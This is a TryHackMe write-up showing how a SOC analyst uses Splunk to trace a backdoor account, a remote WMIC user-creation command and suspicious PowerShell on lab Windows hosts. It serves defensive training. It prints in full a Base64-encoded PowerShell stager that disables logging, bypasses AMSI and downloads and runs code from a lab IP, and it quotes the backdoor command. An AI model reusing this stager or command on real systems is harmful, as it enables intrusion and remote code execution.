---
title: "Investigating with Splunk - TryHackMe Write-up"
seoTitle: "Investigating with Splunk - TryHackMe Write-up"
seoDescription: "Discover how to investigate anomalies and backdoor creation using Splunk logs in this TryHackMe challenge"
datePublished: Tue Aug 05 2025 16:22:51 GMT+0000 (Coordinated Universal Time)
cuid: cmdyqztpv001d02la1o5p71rs
slug: investigating-with-splunk-tryhackme-write-up
canonical: https://medium.com/@forrestcaffray/benign-tryhackme-5f01dfd0f386
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1754411546734/2d07884c-adf7-47a6-a859-4a378c39be61.png
tags: technical-writing-1, tryhackme, tryhackme-walkthrough, technical-writeup

---

Link to room: [https://tryhackme.com/room/investigatingwithsplunk](https://tryhackme.com/room/investigatingwithsplunk)

Let’s do some Splunking shall we!

> SOC Analyst **Johny** has observed some anomalous behaviours in the logs of a few windows machines. It looks like the adversary has access to some of these machines and successfully created some backdoor. His manager has asked him to pull those logs from suspected hosts and ingest them into Splunk for quick investigation. Our task as SOC Analyst is to examine the logs and identify the anomalies.

Boot up the Target Machine and Attackbox.

Connect to the Target Machine using Firefox and the appropriate IP Address.

![Screenshot of the Splunk Enterprise interface showing the app menu with options like "Search & Reporting," "Python Upgrade Readiness App," "Splunk Essentials for Cloud and Enterprise 8.2," and "Splunk Secure Gateway." A hand cursor hovers over "Search & Reporting." The right panel says "Explore Splunk."](https://cdn.hashnode.com/res/hashnode/image/upload/v1754393644750/56748b18-9634-4569-8546-aa3d960179be.png align="center")

Click on Search & Reporting, then change time block.

![Screenshot of Splunk Enterprise interface showing a new search window with the query  entered. There are no events found for the specified time range, and tabs for Events, Patterns, Statistics, and Visualization are visible.](https://cdn.hashnode.com/res/hashnode/image/upload/v1754401889622/622ca2ae-346d-4e00-b6c7-dd9ad08fd2c4.png align="center")

![A dropdown menu labeled "Presets" showing time range options divided into categories: Real-Time, Relative, and Other. Options include various time windows and periods like "30 second window," "Today," and "Last 24 hours."](https://cdn.hashnode.com/res/hashnode/image/upload/v1754401920712/47f93bec-78e4-4def-beaf-889450e803cc.png align="center")

---

> How many events were collected and Ingested in the index **main**?

![A screenshot of a Splunk Enterprise interface showing a search query for the index "main" with 12,256 events. Tabs include Events, Patterns, Statistics, and Visualization. The timeline is visible at the bottom.](https://cdn.hashnode.com/res/hashnode/image/upload/v1754402671693/54d2a7b9-36b8-4df5-826e-e386cba957bb.png align="center")

### \= `12256`

---

> On one of the infected hosts, the adversary was successful in creating a backdoor user. What is the new username?

A wee search brings up Event ID: 4720. This indicates a new user was created.

![A search bar showing a query for "index='main' EventID='4720'", with a result indicating one event found. Various tabs like Events, Patterns, Statistics, and Visualization are visible below.](https://cdn.hashnode.com/res/hashnode/image/upload/v1754403098878/91b4e196-271e-48a2-b91c-858addff6c77.png align="center")

We will find one results, upon deeper inspection we see:

```yaml
New Account:
	Security ID:		S-1-5-21-1969843730-2406867588-1543852148-1000
	Account Name:		A1berto
	Account Domain:		WORKSTATION6
```

### \= `A1berto`

---

> On the same host, a registry key was also updated regarding the new backdoor user. What is the full path of that registry key?

![Screenshot of a search interface showing the query: index="main" alberto.](https://cdn.hashnode.com/res/hashnode/image/upload/v1754405771284/4ba6d2d6-37cf-4418-94e2-e216c0092a54.png align="center")

I searched with `a1berto` and found this:

```yaml
 Message: Registry object added or deleted:
RuleName: -
EventType: CreateKey
UtcTime: 2022-02-14 12:06:02.420
ProcessGuid: {83d0c8c3-43ca-5f5f-0c00-000000000400}
ProcessId: 740
Image: C:\windows\system32\lsass.exe
TargetObject: HKLM\SAM\SAM\Domains\Account\Users\Names\A1berto
```

### \= `HKLM\SAM\SAM\Domains\Account\Users\Names\A1berto`

---

> Examine the logs and identify the user that the adversary was trying to impersonate.

![Screenshot showing a data interface with fields related to user events. "User" is highlighted, displaying four values: NT AUTHORITYYSTEM, Cyberteeslberto, NT AUTHORITYETWORK SERVICE, and Cyberteesames. There are sections for selected and interesting fields on the left.](https://cdn.hashnode.com/res/hashnode/image/upload/v1754406567706/2593d28c-3174-483f-b568-19eec2ceac1b.png align="center")

### \= `Alberto`

---

> What is the command used to add a backdoor user from a remote computer?

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754407047131/3283834a-498d-45b8-9cd5-f7aceda416c7.png align="center")

Looking at EventID 4688 for new process creation we can see 3 events with this being the most interesting snippet:

```yaml
 @version: 1
   Category: Process Creation
   Channel: Security
   CommandLine: "C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add A1berto paw0rd1"
   EventID: 4688
   EventReceivedTime: 2022-02-14 08:06:03
   EventTime: 2022-02-14 08:06:01
   EventType: AUDIT_SUCCESS
   ExecutionProcessID: 4
   Hostname: James.browne
   Keywords: -9214364837600035000
   MandatoryLabel: S-1-16-12288
   Message: A new process has been created.
```

We can also filter via the `CommandLine` field:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754407244646/3bcae53e-2852-46c3-8c0d-fb7e789ea1b1.png align="center")

### \= `C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add A1berto paw0rd1`

---

> How many times was the login attempt from the backdoor user observed during the investigation?

Looking at Event ID 4624 for successful account logon

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754408160451/37ddf47b-3422-4253-88a4-f86e2019fe28.png align="center")

### \= `0`

---

> What is the name of the infected host on which suspicious Powershell commands were executed?

Looking back at the section where the backdoor was being setup:

```yaml
 @version: 1
   Category: Process Creation
   Channel: Security
   CommandLine: "C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add A1berto paw0rd1"
   EventID: 4688
   EventReceivedTime: 2022-02-14 08:06:03
   EventTime: 2022-02-14 08:06:01
   EventType: AUDIT_SUCCESS
   ExecutionProcessID: 4
   Hostname: James.browne
   Keywords: -9214364837600035000
   MandatoryLabel: S-1-16-12288
   Message: A new process has been created.
```

We can see the `Hostname:`

### \= `James.browne`

---

> PowerShell logging is enabled on this device. How many events were logged for the malicious PowerShell execution?

Looking for Event ID 4103 for script block logging:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754409432226/b187c40b-c5b8-4e0a-9a50-74e3052aacf6.png align="center")

### \= `79`

---

> An encoded Powershell script from the infected host initiated a web request. What is the full URL?

On our first results from the previous search query we see an encoded string:

```yaml
ContextInfo:         Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.18362.752
        Host ID = 0f79c464-4587-4a42-a825-a0972e939164
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAUwBJAG8AbgBUAGEAYgBMAGUALgBQAFMAVgBFAHIAUwBJAE8ATgAuAE0AYQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJAAxADEAQgBEADgAPQBbAHIAZQBGAF0ALgBBAFMAcwBlAE0AYgBsAHkALgBHAGUAdABUAHkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAMQAxAEIAZAA4ACkAewAkAEEAMQA4AEUAMQA9ACQAMQAxAEIARAA4AC4ARwBlAHQAVgBhAEwAVQBFACgAJABuAFUAbABMACkAOwBJAGYAKAAkAEEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkAEEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABhADEAOABlADEAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AEEATAA9AFsAQwBvAEwAbABlAGMAdABpAE8ATgBTAC4ARwBlAE4ARQByAGkAQwAuAEQASQBjAFQAaQBPAG4AQQBSAFkAWwBTAHQAcgBJAE4ARwAsAFMAeQBzAFQARQBtAC4ATwBCAEoARQBjAHQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAQQBMAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAYQAxADgAZQAxAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMARQB7AFsAUwBjAFIAaQBwAFQAQgBsAE8AQwBLAF0ALgAiAEcAZQBUAEYASQBFAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbABVAGUAKAAkAE4AdQBMAEwALAAoAE4ARQB3AC0ATwBCAGoAZQBDAHQAIABDAG8ATABMAEUAYwBUAGkATwBOAFMALgBHAGUATgBlAHIASQBjAC4ASABBAHMASABTAGUAdABbAFMAVAByAGkAbgBnAF0AKQApAH0AJABSAGUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAEUATQBCAGwAeQAuAEcAZQBUAFQAeQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBFAHQARgBJAGUATABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATAB1AGUAKAAkAE4AVQBMAGwALAAkAHQAUgBVAGUAKQA7AH0AOwBbAFMAWQBTAHQARQBtAC4ATgBlAFQALgBTAGUAcgB2AEkAQwBlAFAAbwBJAE4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABwAGUAQwBUADEAMAAwAEMAbwBuAHQASQBOAHUAZQA9ADAAOwAkADcAYQA2AGUARAA9AE4AZQBXAC0ATwBCAEoAZQBDAFQAIABTAFkAcwB0AGUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAEkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAFQALgBFAE4AQwBvAGQAaQBOAEcAXQA6ADoAVQBuAGkAYwBvAGQARQAuAEcAZQB0AFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgBUAF0AOgA6AEYAcgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADcAQQA2AEUAZAAuAEgARQBBAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADcAYQA2AEUAZAAuAFAAUgBPAHgAWQA9AFsAUwB5AFMAVABFAG0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUAZQBzAFQAXQA6ADoARABlAGYAQQBVAEwAdABXAGUAQgBQAFIAbwBYAFkAOwAkADcAYQA2AEUARAAuAFAAUgBPAFgAWQAuAEMAUgBlAGQARQBuAHQASQBBAGwAUwAgAD0AIABbAFMAWQBzAFQARQBNAC4ATgBFAHQALgBDAFIAZQBkAEUAbgBUAEkAYQBMAEMAYQBjAGgARQBdADoAOgBEAEUARgBhAFUAbAB0AE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AdABJAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADcAYQA2AGUAZAAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAdABlAE0ALgBUAGUAWABUAC4ARQBuAEMAbwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQBUAGUAUwAoACcAcQBtAC4AQAApADUAeQA/AFgAeAB1AFMAQQAtAD0AVgBEADQANgA3ACoAfABPAEwAVwBCAH4AcgBuADgAXgBJACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANwBBADYAZQBkAC4ASABlAEEARABlAHIAcwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBLAHUAVQB6AHUAaQBkAD0AVgBtAGUASwBWADUAZABlAGsAZwA5AHkANwBrAC8AdABsAEYARgBBADgAYgAyAEEAYQBJAHMAPQAiACkAOwAkAEQAYQB0AGEAPQAkADcAYQA2AGUAZAAuAEQAbwB3AE4ATABvAGEAZABEAGEAdABBACgAJABTAEUAcgArACQAdAApADsAJABpAHYAPQAkAEQAQQBUAEEAWwAwAC4ALgAzAF0AOwAkAEQAYQBUAEEAPQAkAGQAQQBUAEEAWwA0AC4ALgAkAEQAYQBUAEEALgBMAEUAbgBHAHQASABdADsALQBKAE8AaQBOAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
        Engine Version = 5.1.18362.752
        Runspace ID = a6093660-16a6-4a60-ae6b-7e603f030b6f
        Pipeline ID = 1
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = 
        Command Path = 
        Sequence Number = 744
        User = Cybertees\James
        Connected User = 
        Shell ID = Microsoft.PowerShell
```

Take that string over to [CyberChef](https://gchq.github.io/). Looking at it, it immediately looks like a Base64 string to me - “==” (padding) at the end and the way it’s formatted is a big giveaway!

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754410004119/ae70beeb-dc7e-481f-8f9f-fbbe10e93efd.png align="center")

This Recipe worked well for me, decoding the string and removing the null bytes to reveal everything.  
**Pro Tip:** You use “To Lower case” to make things a little easier to read, just remember to disable this when dealing with any strings within.

Inspecting the block we see this snippet:

`FroMBASe64StRInG('aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA==')));$t='/news.php'`

Another Base64 encoded string which reveals this IP address: [`http://10.10.10.5`](http://10.10.10.5)

You can opt to “Extract Domains” or “Extract File paths” in CyberChef if you want but we can easily see the `/news.php` part.

Put this together and use “Defang URL” in CyberChef.

### \= `hxxp[://]10[.]10[.]10[.]5/news[.]php`

---

Nice wee exercise to get familiar with filtering and finding information in Splunk. Hope you have enjoyed it is as much as I have! I always try to find the simplest methods.